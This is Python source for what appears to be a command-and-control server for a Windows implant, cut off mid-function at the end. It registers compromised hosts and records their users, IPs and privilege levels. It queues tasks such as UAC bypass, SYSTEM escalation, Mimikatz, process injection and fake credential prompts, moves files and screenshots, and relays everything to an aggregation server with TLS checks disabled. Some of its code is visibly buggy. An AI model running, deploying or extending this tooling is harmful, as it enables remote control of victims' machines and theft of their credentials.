from enum import Enum

from .libs.sRDI.ShellcodeRDI import *

class taskstatus(Enum):
    Queued = 1
    Pending = 2
    Executing = 3
    Complete = 4
    Failed = 5
    NotSupported = 6

class tasktype(Enum):
    Terminate = 1
    Command = 2
    Pwd = 3
    ChangeDir = 4
    Whoami = 5
    PsList = 6
    Download = 7
    Upload = 8 # The upload cmd is from the Server's perspective. Therefore, your Client will perform the action as a download.
    ListPrivs = 9
    SetPriv = 10
    RemoteInject = 11
    BypassUAC = 12
    GetSystem = 13
    Screenshot = 14
    Sleep = 15
    Mimikatz = 16
    Copy = 17
    Move = 18
    Delete = 19
    CreateKey = 20
    WriteValue = 21
    DeleteKey = 22
    DeleteValue = 23
    QueryKey = 24
    QueryValue = 25
    CreateScheduledTask = 26
    StartScheduledTask = 27
    Netstat = 28
    Ipconfig = 29
    MessageBox = 30
    Dir = 31
    PromptUserCreds = 32
    
class requesttype(Enum):
    Registration = 1
    GetNextTask = 2
    TaskResult = 3
    UploadStart = 4
    UploadChunk = 5
    UploadEnd = 6
    DownloadStart = 7
    DownloadChunk = 8
    DownloadEnd = 9

class processarch(Enum):
    x64 = 1
    x86 = 2

tasktype_values = [
    tasktype.ListPrivs.value,
    tasktype.SetPriv.value,
    tasktype.BypassUAC.value,
    tasktype.Screenshot.value,
    tasktype.GetSystem.value,
    tasktype.Copy.value,
    tasktype.Move.value,
    tasktype.Delete.value,
    tasktype.CreateKey.value,
    tasktype.WriteValue.value,
    tasktype.DeleteKey.value,
    tasktype.DeleteValue.value,
    tasktype.QueryKey.value,
    tasktype.QueryValue.value,
    tasktype.CreateScheduledTask.value,
    tasktype.StartScheduledTask.value,
    tasktype.Netstat.value,
    tasktype.Ipconfig.value,
    tasktype.MessageBox.value,
    tasktype.PromptUserCreds.value,
    tasktype.Mimikatz.value,
]

from flask import Flask, jsonify, url_for
from flask_sqlalchemy import SQLAlchemy
from flask import request, make_response, abort

from os import path as os_path
import uuid

import platform, os, re, ctypes, getpass, socket, json, urllib, ssl, time
import toml
import logging
from concurrent_log_handler import ConcurrentRotatingFileHandler

CONFIGDATA = toml.load("config.toml")

LISTEN_HOST = CONFIGDATA['settings']['LISTEN_HOST']
LISTEN_PORT = CONFIGDATA['settings']['LISTEN_PORT']
SERVER_URL = CONFIGDATA['settings']['AGGREGATION_SERVER_URL']
AGENT_TYPE = CONFIGDATA['settings']['AGENT_TYPE']
AUTH_TOKEN = CONFIGDATA['settings']['AUTH_TOKEN']
KEY = CONFIGDATA['settings']['KEY']
GOOD_IPS = CONFIGDATA['settings']['GOOD_IPS']
DATABASE_CREDS = CONFIGDATA['settings']['DATABASE_CREDS']
DATABASE_LOCATION = CONFIGDATA['settings']['DATABASE_LOCATION']
DATABASE_DB = CONFIGDATA['settings']['DATABASE_DB']
LOGFILE = CONFIGDATA['settings']['LOGFILE']

def setup_logging(argname="default",app=None): #note that argname is now unused
    context = os.environ.get("APP_CONTEXT", "DEFAULT")
    name = context
    logger = logging.getLogger(name)

    if logger.handlers:
        #logger.info(f"setup_logging(): logger already exists, returning existing logger")
        return logger

    logger.setLevel(logging.INFO)

    handler = ConcurrentRotatingFileHandler(
        LOGFILE,        # LOGFILE path
        "a",              # append mode
        10 * 1024 * 1024, # maxBytes: 10MB
        10,               # backupCount: keep 10 old logs
        encoding='utf-8'
    )
    stream_handler = logging.StreamHandler(sys.stdout)
    
    formatter = logging.Formatter(
        '[%(asctime)s] [%(name)s] [%(process)d] %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    handler.setFormatter(formatter)
    stream_handler.setFormatter(formatter)
    
    logger.addHandler(handler)
    logger.addHandler(stream_handler)
    
    # Optional: Prevent logs from bubbling up to the root logger
    logger.propagate = False

    if context == "SERVER":
        gunicorn_logger = logging.getLogger("gunicorn.error")
        gunicorn_logger.addHandler(handler)
    # Optional: Catch all other library logs (SQLAlchemy, etc.)
    logging.getLogger().addHandler(stream_handler)

    if app:
        # Remove Flask's default handlers to avoid double-logging
        app.logger.handlers = []
        
        # Add your custom high-performance handlers to Flask
        app.logger.addHandler(handler)
        app.logger.addHandler(stream_handler)
        
        # Ensure Flask's logger level matches your custom logger
        app.logger.setLevel(logging.INFO)
    
    return logger

app = Flask(__name__)
logger = setup_logging("server",app)

if DATABASE_LOCATION:
    app.config['SQLALCHEMY_DATABASE_URI'] = f"postgresql+psycopg2://{ DATABASE_CREDS }@{ DATABASE_LOCATION }/{ DATABASE_DB }"
    logger.info(f"DATABASE BACKEND: using postgresql at {DATABASE_LOCATION}")
else:
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os_path.join(app.root_path, '..','data.db') # uncomment this to use sqlite for the database backend!
    logger.info(f"DATABASE BACKEND: using sqlite3 at {os_path.join(app.root_path, '..','data.db')}")
app.app_context().push()
db = SQLAlchemy(app)

# Models
class Agent(db.Model):
    __tablename__ = 'agents'
    id = db.Column(db.String(8), primary_key=True)
    machine_guid = db.Column(db.String)
    hostname = db.Column(db.String)
    username = db.Column(db.String)
    operating_system = db.Column(db.String(1024))
    process_arch = db.Column(db.Integer)
    internal_ip = db.Column(db.String(16))
    external_ip = db.Column(db.String(16))
    integrity = db.Column(db.Integer) # 1-6 https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/integrity-levels
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    tasks = db.relationship("Task", back_populates="agent")

    def __init__(self, machine_guid='', hostname='', username='', operating_system='', process_arch=1, internal_ip='', external_ip='', integrity=3):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8] # we could change this to an auto incrementing integer, but that has reverse engineering concerns. however, it would improve collision security and usability.
        self.machine_guid = machine_guid
        self.hostname = hostname
        self.username = username
        self.operating_system = operating_system
        self.internal_ip = internal_ip
        self.external_ip = external_ip
        self.process_arch = process_arch
        self.integrity = integrity

    def json(self):
        return { 
            'id': self.id, 
            'machine_guid': self.machine_guid,
            'hostname': self.hostname,
            'username': self.username,
            'internal_ip': self.internal_ip,
            'external_ip': self.external_ip,
            'integrity': self.integrity,
            'process_arch': self.process_arch,
            'operating_system': self.operating_system,
            'created': self.created,
            'updated': self.updated
        }


class DownloadFileChunk(db.Model):
    __tablename__ = 'downloadfilechunks'
    id = db.Column(db.Integer, primary_key=True)
    data = db.Column(db.String)
    downloadfile_id = db.Column(db.String(8), db.ForeignKey('downloadfiles.id'))
    next_chunk_id = db.Column(db.Integer, db.ForeignKey('downloadfilechunks.id'))
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    def __init__(self,data='',downloadfile_id=''):
        self.data = data
        self.type = 2
        self.downloadfile_id = downloadfile_id
    
    def json(self):
        return {
            'id': self.id,
            'data': self.data,
            'downloadfile_id':self.downloadfile_id,
            'created': self.created, 
            'updated': self.updated
        }

class UploadFileChunk(db.Model):
    __tablename__ = 'uploadfilechunks'
    id = db.Column(db.Integer, primary_key=True)
    data = db.Column(db.String)
    uploadfile_id = db.Column(db.String(8), db.ForeignKey('uploadfiles.id'))
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    def __init__(self, data='',uploadfile_id=''):
        self.data = data
        self.type = 1
        self.uploadfile_id = uploadfile_id
    
    def json(self):
        return {
            'id': self.id,
            'data': self.data,
            'uploadfile_id':self.uploadfile_id,
            'created': self.created, 
            'updated': self.updated
        }


class UploadFile(db.Model):
    __tablename__ = 'uploadfiles'
    id = db.Column(db.String(8), primary_key=True)
    srv_path = db.Column(db.String) # location on the server
    path = db.Column(db.String) # location on the host running the implant
    type = db.Column(db.Integer) # 1=upload, # 2=download
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())
    
    task_id = db.Column(db.String(8), db.ForeignKey('tasks.id'))
    
    def __init__(self, srv_path='', path=''):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.srv_path = srv_path
        self.path = path
        self.type = 1

    def json(self):
        return {
            'id': self.id,
            'type': self.type,
            'srv_path': self.srv_path,
            'path': self.path,
            'created': self.created, 
            'updated': self.updated
        }

class DownloadFile(db.Model):
    __tablename__ = 'downloadfiles'
    id = db.Column(db.String(8), primary_key=True)
    path = db.Column(db.String) # location on the host running the implant
    srv_path = db.Column(db.String) # location on the server
    type = db.Column(db.Integer) # 1=upload, # 2=download
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    task_id = db.Column(db.String(8), db.ForeignKey('tasks.id'))

    def __init__(self,srv_path='',path='',user='',host=''):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.srv_path = srv_path
        self.type = 2
        self.path = path

    def json(self):
        return {
            'id': self.id,
            'type': self.type,
            'srv_path': self.srv_path,
            'path': self.path,
            'created': self.created, 
            'updated': self.updated
        }


# type: included in TaskList.txt
# status: 1=queued,2=executing,3=complete,4=error 
class Task(db.Model):
    __tablename__ = 'tasks'
    id = db.Column(db.String(8), primary_key=True)
    type = db.Column(db.Integer)
    status = db.Column(db.Integer)
    input = db.Column(db.String)
    result = db.Column(db.String)
    agent_id = db.Column(db.String(8), db.ForeignKey('agents.id'))
    uploadfile_id = db.Column(db.String(8), db.ForeignKey('uploadfiles.id'))
    downloadfile_id = db.Column(db.String(8), db.ForeignKey('downloadfiles.id'))
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())
    aggregation_task_id = db.Column(db.Integer)

    agent = db.relationship(Agent,back_populates="tasks")
    
    def __init__(self, status=0, type=0, input='', result='', agent_id='', aggregation_task_id=None):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.status = status
        self.type = type
        self.input = input
        self.result = result
        self.agent_id = agent_id
        self.aggregation_task_id = aggregation_task_id

    def json(self):
        return { 
            'id': self.id, 
            'type': self.type, 
            'status': self.status,
            'input': self.input, 
            'result': self.result, 
            'agent_id': self.agent_id, 
            'uploadfile_id': self.uploadfile_id,
            'downloadfile_id': self.downloadfile_id,
            'created': self.created, 
            'updated': self.updated,
            'aggregation_task_id': self.aggregation_task_id
        }


################################
# Start Aggregation Server Compat
################################

# Allow connection to the server (uses a self signed cert)
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def print_debug(message):
    # Stub function for a more detailed logging functionally present in Andrew's main codebase that doesn't make sense to replicate here
    logger.info(message)

def send_message(agent,endpoint,message="",oldStatus=True,newStatus=True,server_timeout=5):
    """
    Sends the specified data to the server.
    Handles the full process and attaching agent name/auth/system details.

    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool)
    Returns: status(Bool)
    """
    global AUTH_TOKEN
    if not SERVER_URL:
        # Server comms are intentionally disabled
        # Maybe redirect to print_debug instead?
        return False, "no SERVER_URL value specified"

    try:
        url = SERVER_URL + endpoint

        # Prep payload
        payload = {
            "name": agent.id,
            "hostname": agent.hostname,
            "ip": agent.internal_ip,
            "os": agent.operating_system,
            "executionUser": agent.username,
            "executionAdmin": agent.integrity > 2,
            "auth": AUTH_TOKEN,
            "agent_type": AGENT_TYPE,
            "oldStatus": oldStatus,
            "newStatus": newStatus,
            "message": message
        }

        # Prepare data as JSON for transmit
        data = json.dumps(payload).encode("utf-8")

        # Build request
        req = urllib.request.Request(
            url,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST" # literally every endpoint is standardized on POST
        )

        # Send payload
        with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
            if response.getcode() == 200:
                # Good result! Now parse and return the endpoint
                print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
                response_text = response.read().decode('utf-8')
                if "agent/beacon" in endpoint: # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
                    if response_text != AUTH_TOKEN:
                        AUTH_TOKEN = response_text
                        print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
                return True, response_text
            else:
                print_debug(f"send_message({url}): Server error: {response.getcode()}")

    # Error handling
    except urllib.error.HTTPError as e:
        print_debug(f"[send_message({url}): HTTP error: {e.code} {e.reason}")
    except urllib.error.URLError as e:
        print_debug(f"send_message({url}): URL error: {e.reason}")
    except Exception as e:
        # Various requests errors - networking failure or 4xx/5xx code from server (out of scope for client-side error handling)
        print_debug(f"send_message({url}): Beacon error: {e}")
    return False, ""

################################
# End Aggregation Server Compat
################################

from pprint import pprint
import json
import base64

from os import getcwd
from os import makedirs
from os import path
import os

import shutil
import hashlib

from Crypto.Cipher import ARC4
from Crypto.Hash import MD5

def _get_wincrypt_rc4_key():
    return MD5.new(KEY).digest()

def rc4_encrypt(data: bytes) -> bytes:
    key_bytes = _get_wincrypt_rc4_key()
    cipher = ARC4.new(key_bytes)
    return cipher.encrypt(data)

def rc4_decrypt(data: bytes) -> bytes:
    key_bytes = _get_wincrypt_rc4_key()
    cipher = ARC4.new(key_bytes)
    return cipher.decrypt(data)

def encrypt_and_encode(data: dict) -> str:
    plain = json.dumps(data).encode()
    enc = rc4_encrypt(plain)
    return base64.b64encode(enc).decode()

def decode_and_decrypt(b64_str: str) -> dict:
    try:
        enc = base64.b64decode(b64_str)
        #logger.info(f"decode_and_decrypt - {enc}")
        dec = rc4_decrypt(enc)
        text = dec.decode(errors="ignore")
        return json.loads(text)
    except Exception as e:
        logger.error(f"decode_and_decrypt failed: {e}")
        logger.error(f"Partial decrypted: {repr(dec[:100] if 'dec' in locals() else b'')}")
        return {}

db.create_all()
#app.config['DEBUG'] = True #TODO remove?
app.config['DEBUG'] = False

#@app.before_request
def restrict_page():
    if len(GOOD_IPS) > 1:
        if request.remote_addr not in GOOD_IPS:
            abort(404)  # Not Found

@app.route("/api/send",methods=["POST"])
def send():
    restrict_page() # in the future this could be adjusted to not be restricted and just add to good_ip with each successful registration!
    # however this entire concept is flawed and should be replaced with the auth token method :/

    if request.is_json:
        try:
            
            # this is absolute hell
            req = request.get_json()
            external_ip = request.remote_addr # Need to grab before decrypting
            b64d = req.get("d")
            outer_json = base64.b64decode(b64d).decode("utf-8")
            d = json.loads(outer_json)
            b64data = d["data"]
            decoded_inner = base64.b64decode(b64data)
            decrypted_inner = rc4_decrypt(decoded_inner)
            text = decrypted_inner.decode("utf-8")
            data = json.loads(text)

            if d['ht'] != requesttype.Registration.value:
                agent = db.session.query(Agent).get(data['agent_id'])
                status, response = send_message(agent,"agent/beacon","keepalive")
            
            if d['ht'] == requesttype.Registration.value:
                # agent registration
                operating_system = username = machine_guid = hostname = internal_ip = 'unknown'
                ## medium integrity
                integrity = 3
                
                if data['integrity'] >= 1 and data['integrity'] <= 5:
                    integrity = int(data['integrity'])

                process_arch = processarch.x64
                if data['process_arch']:
                    process_arch = data['process_arch']
                
                if data['machine_guid']:
                    machine_guid = data['machine_guid']
                
                if data['hostname']:
                    hostname = data['hostname']
                
                if data['username']:
                    username = data['username']
                
                if data['os']:
                    operating_system = data['os']
            
                if data['internal_ip']:
                    internal_ip = data['internal_ip']

                myobj = Agent(
                    machine_guid = machine_guid, 
                    hostname = hostname, 
                    username = username,
                    operating_system = operating_system,
                    process_arch = process_arch,
                    internal_ip = internal_ip,
                    external_ip = external_ip,
                    integrity = integrity,
                )
                db.session.add(myobj)
                db.session.commit()

                status, response = send_message(myobj,"agent/beacon","register")
                
                json_data = {
                    "message": "OK",
                    "agent_id": myobj.id
                }

                b64data = base64.urlsafe_b64encode(json.dumps(json_data).encode()).decode()
                response_body = { 'data': b64data }

            elif d['ht'] == requesttype.GetNextTask.value:
                ## get next task
                if not data['agent_id']:
                    return {}

                task = db.session.query(Task).filter(Task.agent_id==data['agent_id'],Task.status==1).order_by(db.asc(Task.updated)).first()
                if task is None:
                    # Check to see if the aggregation server has a task
                    agent = db.session.query(Agent).get(data['agent_id'])
                    status, response = send_message(agent,"agent/beacon","keepalive")
                    if status:
                        if response != "no pending tasks":
                            # We have a task waiting! Let's decode it:
                            data = json.loads(response)
                            task_id = data.get('task_id')
                            task_command = data.get('task')

                            # assume its just generic shell
                            myobj = Task(status=1, type=tasktype.Command.value, input=task_command, result='', agent_id=data['agent_id'], aggregation_task_id=task_id)
                            db.session.add(myobj)
                            db.session.commit()

                            task = db.session.query(Task).filter(Task.agent_id==data['agent_id'],Task.status==1).order_by(db.asc(Task.updated)).first()
                        else:
                            return {}
                    else:
                        return {}

                if task.type in tasktype_values:
                    db_file = db.session.query(DownloadFile).get(task.downloadfile_id)
                    if not db_file:
                       return {}
                    db_file.task_id = task.id
                    if task.type == tasktype.Download.value:
                        task.input = db_file.path
                    
                task.status = taskstatus.Pending.value
                task.updated = db.func.now()
                agent = db.session.query(Agent).get(task.agent_id)
                agent.updated = task.updated
                db.session.commit()

                json_data = {
                        "input": task.input,
                        "type": task.type,
                        "status": task.status,
                        "id": task.id,
                        "agent_id": agent.id
                    }
                
                if task.type in tasktype_values:
                    json_data["file_id"] = task.downloadfile_id
                    
                b64data = base64.urlsafe_b64encode(json.dumps(json_data).encode()).decode()
                
                task.status = taskstatus.Executing.value
                db.session.commit()
                response_body = { 'data': b64data }
            elif d['ht'] == requesttype.TaskResult.value:
                ## task result
                pprint(data) 
                task = db.session.query(Task).filter(Task.id==str(data['id']),Task.agent_id==str(data['agent_id'])).first()
                if task is None:
                    logger.warning(f"Taskresult - not task")
                    return {}

                # check if status is: 4=complete|5=failed|6=notsupported
                if int(data['status']) >= 4 and int(data['status']) <= 6: 
                    task.status = int(data['status'])
                else:
                    task.status = taskstatus.Executing.value

                if data['result'] is None:
                    logger.warning(f"TaskResult - not result")
                else:
                    task.result = data['result']
 
                task.updated = db.func.now()
                agent = db.session.query(Agent).get(task.agent_id)
                agent.updated = task.updated
                db.session.commit()

                if task.aggregation_task_id:
                    resultjson = json.dumps({"task_id": task.aggregation_task_id, "result": task.result}, separators=(',', ':')) # specify separators to compact whitespace
                    status, response = send_message("agent/set_task_result",message=resultjson)

                response_body = {
                    "message": "OK",
                }
            ## upload start
            elif d['ht'] == requesttype.UploadStart.value:
                task = db.session.query(Task).get(data['task_id'])
                if task is None:
                    logger.warning(f"UploadStart - not task")
                    return {}
                
                db_file = UploadFile(
                    path = data['path']
                )
                db.session.add(db_file)
                db.session.commit()
                task.uploadfile_id = db_file.id
                db.session.commit()
                db_filechunk = UploadFileChunk(
                    data = data['content'],
                    uploadfile_id = db_file.id
                )
                db.session.add(db_filechunk)
                
                agent = db.session.query(Agent).get(task.agent_id)
                agent.updated = task.updated
                db.session.commit()
                response_body = {
                        "message": "OK",
                        "id": str(db_file.id)
                    }
            ## upload chunk              
            elif d['ht'] == requesttype.UploadChunk.value:
                db_filechunk = UploadFileChunk(
                    data = data['content'],
                    uploadfile_id = data['file_id']
                )
                db.session.add(db_filechunk)
                db.session.commit()
                response_body = {
                    "message": "OK",
                }
            ## upload end
            elif d['ht'] == requesttype.UploadEnd.value:
                task = db.session.query(Task).filter(Task.id==str(data['task_id']),Task.agent_id==str(data['agent_id'])).first()
                if task is None:
                    logger.warning(f"UploadEnd - not task")
                    return {}

                if data['result'] is None:
                    logger.warning(f"UploadEnd - not result")

                
                if data['status'] is None:
                    logger.warning(f"UploadEnd - not status")    
                else:
                    task.status = data['status']
                    
                task.result = ""
                task.updated = db.func.now()
                agent = db.session.query(Agent).get(task.agent_id)
                agent.updated = task.updated
                db.session.commit()
    
                db_file = db.session.query(UploadFile).get(task.uploadfile_id)
                if db_file is None:
                    logger.warning(f"UploadEnd - db_file doesnt exist for id {task.uploadfile_id}")
                    return {}
                
                cwd = os.getcwd()
                path = ""
                if task.type == tasktype.Download.value:
                    path = os_path.join(cwd,"data",task.agent_id,"upload",data['task_id'],"file")
                elif task.type == tasktype.Upload.value:
                    path = os_path.join(cwd,"data",task.agent_id,"download",data['task_id'],"file")
                elif task.type == tasktype.Screenshot.value:
                    path = os_path.join(cwd,"data","screenshot")
                
                try:
                    os.makedirs(path)    
                except OSError as error:
                    logger.warning(f"UploadEnd - {error}")  
                    
                tmp = db_file.path.split('\\')
                if task.type == tasktype.Screenshot.value:
                    filename = "screenshot.png"
                else:
                    filename = tmp[-1]

                guid = uuid.uuid4()
                myguid = str(guid)[0:8]
                filename = myguid + "-" + filename

                fullpath = os_path.join(path,filename)
                
                if task.type == tasktype.Screenshot.value:
                    screenshot = True

                with open(fullpath, 'wb') as fl:
                    result = db.session.query(UploadFileChunk).filter(UploadFileChunk.uploadfile_id == task.uploadfile_id).all()
                    if screenshot:
                        for i in result:
                            fl.write(base64.b64decode(base64.b64decode(i.data)))
                    else:
                        for i in result:
                            fl.write(base64.b64decode(i.data))
                    fl.close()
                
                #https://www.quickprogrammingtips.com/python/how-to-calculate-md5-hash-of-a-file-in-python.html
                md5_hash = hashlib.md5()
                sha256_hash = hashlib.sha256()
                with open(fullpath, 'rb') as f:
                    # Read and update hash in chunks of 4K
                    for byte_block in iter(lambda: f.read(4096),b""):
                        md5_hash.update(byte_block)
                        sha256_hash.update(byte_block)
                        
                result = "file saved to: {}\nMD5:{}\nSHA256:{}\n".format(fullpath,md5_hash.hexdigest(),sha256_hash.hexdigest())
                
                b64result = base64.b64encode(result.encode('utf-8'))
                task.result = b64result.decode('utf-8')
                
                db.session.commit()
                response_body = {
                    "message": "OK",
                }    
            ## download file          
            elif d['ht'] == requesttype.DownloadStart.value:
                task = db.session.query(Task).get(data['task_id'])
                if task is None:
                    logger.warning(f"DownloadStart - not task")
                    return {}
                
                db_file = db.session.query(DownloadFile).get(data['file_id'])
                
                if db_file is None:
                    logger.warning(f"DownloadStart - DownloadFile file_id not found for id {data['file_id']}")
                    return {}
                
                db_chunks = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).order_by(DownloadFileChunk.id).limit(2)
                total = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).count()
                
                next_chunk_id = 0
                # assign next_chunk only when we have it
                if total > 1:
                    next_chunk_id = db_chunks[0].next_chunk_id
                
                task.downloadfile_id = db_file.id
                agent = db.session.query(Agent).get(task.agent_id)
                agent.updated = task.updated
                db.session.commit()
                    
                response_body = {
                        "message": "OK",
                        "chunk": db_chunks[0].data.decode('ascii'),
                        "next_chunk_id": next_chunk_id,
                        "total": int(total)
                    }    
            ## download chunk          
            elif d['ht'] == requesttype.DownloadChunk.value:
                db_file = db.session.query(DownloadFile).get(data['file_id'])
                if db_file is None:
                    logger.warning(f"DownloadChunk - DownloadFile file_id not found")
                    return {}
                
                db_filechunk = db.session.query(DownloadFileChunk).get(data['chunk_id'])
                
                total = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).count()
                
                if db_filechunk.next_chunk_id != 0:
                    next_filechunk = db.session.query(DownloadFileChunk).get(db_filechunk.next_chunk_id)
                    if next_filechunk is None:
                        next_chunk_id = 0
                    else:    
                        next_chunk_id = next_filechunk.id
                else:
                    next_chunk_id = 0
                    
                response_body = {
                    "message": "OK",
                    "id": db_filechunk.id,
                    "chunk": db_filechunk.data.decode('ascii'),
                    "next_chunk_id": next_chunk_id,
                    "total": int(total)
                }
            ## download end
            elif d['ht'] == requesttype.DownloadEnd.value:
                
                task = db.session.query(Task).filter(Task.id==data['task_id'],Task.agent_id==data['agent_id']).first()
                if task is None:
                    logger.warning(f"DownloadEnd - not task")
                    return {}

                #task.downloadfile_id
                db_file = db.session.query(DownloadFile).get(task.downloadfile_id)
                
                ## update status only if we are downloading the file to disk, else we are probably exec'ing with it.
                if task.type == tasktype.Download.value:
                    if data['status'] is None:
                        logger.warning(f"DownloadEnd - not status")    
                    else:
                        task.status = data['status']
                        task.input = db_file.srv_path + " " + db_file.path
                                        
                task.result = ""
                task.updated = db.func.now()
                agent = db.session.query(Agent).get(task.agent_id)
                db.session.commit()

                response_body = {
                    "message": "OK",
                }         
        except BaseException as e:
            db.session.rollback()
            response_body = {
                "message": "error",
            }
        finally:
            db.session.close()
            
        res = make_response(jsonify(response_body), 200)
        return res
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)
    
@app.route("/admin/api/task",methods=["POST"])
def add_task():
    restrict_page()

    if request.is_json:
        req = request.get_json()
        b64data = req.get("data")
        json_data = base64.b64decode(b64data).decode('utf-8')
        data = json.loads(json_data)
        pprint(data)

        if not int(data['type']) > 0 or not str(data['agent_id']):
            return {}
        
        logger.info(f"/admin/api/task - agent_id: {data['agent_id']}, input: {data['input']}")
        input_path = ""
        
        ## update path on windows for upload task
        if data['type'] == tasktype.Download.value:
            input_path = data['input']
            input_path = input_path.replace('\\','\\')
        else:
            input_path = data['input']
                
        myobj = Task(status=1, type=data['type'], input=str(input_path), result='', agent_id=str(data['agent_id']))
        db.session.add(myobj)
        db.session.commit()

        response_body = {
            "message": "OK",
        }
        res = make_response(jsonify(response_body), 200)
        return res
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)    

@app.route("/admin/api/dropdb",methods=["GET"])
def dropdb():
    restrict_page()

    db.session.query(DownloadFile).delete()
    db.session.query(UploadFile).delete()
    db.session.query(DownloadFileChunk).delete()
    db.session.query(UploadFileChunk).delete()
    
    db.session.query(Task).delete()
    db.session.query(Agent).delete()
    db.session.commit()

    return {}
    
@app.route("/admin/api/agents",methods=["GET"])
def list_agents():
    restrict_page()

    agents = db.session.query(Agent).order_by(db.desc(Agent.updated)).all()
    return jsonify([i.json() for i in agents])


@app.route("/admin/api/agent/<id>",methods=["GET"])
def get_agent(id):
    restrict_page()
    
    agent = db.session.query(Agent).get(id)
    if agent is None:
        return {}

    return jsonify(agent.json())    

@app.route("/admin/api/tasks",methods=["GET"])
def list_tasks():
    restrict_page()

    tasks = db.session.query(Task).order_by(db.desc(Task.updated)).all()
    return jsonify([i.json() for i in tasks])

@app.route("/admin/api/task/<id>",methods=["GET"])
def get_task(id):
    restrict_page()

    task = db.session.query(Task).get(id)
    if task is None:
        return {}

    return jsonify(task.json())

@app.route("/admin/api/task/<id>",methods=["PUT"])
def update_task(id):
    restrict_page()

    task = db.session.query(Task).get(id)
    if task is None:
        return {}

    if request.is_json:
        req = request.get_json()
        b64data = req.get("data")
        json_data = base64.b64decode(b64data).decode('utf-8')
        data = json.loads(json_data)
        
        if data['status']:
            task.status = data['status']
        if data['type']:
            task.type = data['type']
        if data['input']:
           task.input = data['input']
        if data['result']:
            task.result = data['result']
        
        task.updated = db.func.now()
        db.session.commit()
    return jsonify(task.json())

@app.route("/admin/api/agent/<id>",methods=["PUT"])
def update_agent(id):
    restrict_page()

    agent = db.session.query(Agent).get(id)
    if agent is None:
        return {}

    if request.is_json:
        req = request.get_json()
        b64data = req.get("data")
        json_data = base64.b64decode(b64data).decode('utf-8')
        data = json.loads(json_data)
        if data['machine_guid']:
            agent.machine_guid = data['machine_guid']
        if data['hostname']:
            agent.hostname = data['hostname']
        if data['username']:
            agent.username = data['username']
        if data['os']:
            agent.os = data['os']
        if data['internal_ip']:
            agent.internal_ip = data['internal_ip']
        if data['external_ip']:
            agent.external_ip = data['external_ip']
        if data['integrity']:
            agent.integrity = data['integrity']
        if data['process_arch']:
            agent.process_arch = data['process_arch']
        agent.updated = db.func.now()
        db.session.commit()
    return jsonify(agent.json())

@app.route("/admin/api/agent_task/<agent_id>",methods=["GET"])
def get_agent_task(agent_id):
    restrict_page()
        
    try:
        result = db.session.query(Task).filter(Task.agent_id==agent_id).order_by(db.desc(Task.updated)).all()
        data = []
        for i in result:
            data.append(i.json())
        
        response_body = data
    except BaseException as e:
        db.session.rollback()
        response_body = {
            "message": "error",
        }
    finally:
        db.session.close()
        
    res = make_response(jsonify(response_body), 200)
    return res    
       
## added for downloading file
@app.route("/admin/api/host_download_file",methods=["POST"])
def host_download_file():
    restrict_page()

    if request.is_json:
        try:
            req = request.get_json()
            agent_id = req.get("agent_id")
            input_path = req.get("path")
            dst_path = req.get("dst_path")
            
            cwd = os.getcwd()

            filepath = ""
            basename = ""
            path = os_path.join(cwd,"data",agent_id,"download")
            
            if os.name == 'nt':
                basename = input_path.split("\\")[-1]
            else:
                basename = input_path.split("/")[-1]    
                
            filepath = os_path.join(path,basename)

            try:
                os.makedirs(path)
            except OSError as error:
                logger.error(f"/admin/api/host_download_file OSError- {error}")    

            shutil.copyfile(input_path, filepath)
            
            db_file = DownloadFile(
                srv_path=filepath,
                path=dst_path
            )
            db.session.add(db_file)
            db.session.commit()

            with open(filepath, 'rb') as fl:
                data = fl.read(1024*1024)
                while data:
                    b64data = base64.b64encode(data)
                    db_filechunk = DownloadFileChunk(
                        data = b64data,
                        downloadfile_id = db_file.id
                    )
                    db.session.add(db_filechunk)
                    db.session.commit()
                    data = fl.read(1024*1024)
            
            db_chunks = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).order_by(DownloadFileChunk.id).all()
            maxlen = len(db_chunks)
            for key,value in enumerate(db_chunks):
                if int(key+1) == maxlen:
                    value.next_chunk_id = 0
                else:
                    value.next_chunk_id = db_chunks[int(key+1)].id
                db.session.commit()
         
                 
            myobj = Task(status=1, type=tasktype.Download.value, input=dst_path, result='', agent_id=agent_id)
            myobj.downloadfile_id = db_file.id
            db.session.add(myobj)
            db.session.commit()
                    
            response_body = {
                "message": "OK",
            }
        except BaseException as e:
            logger.error(f"/admin/api/host_download_file - BaseException: {e.message}")
            db.session.rollback()
            response_body = {
                "message": "error",
            }
        finally:
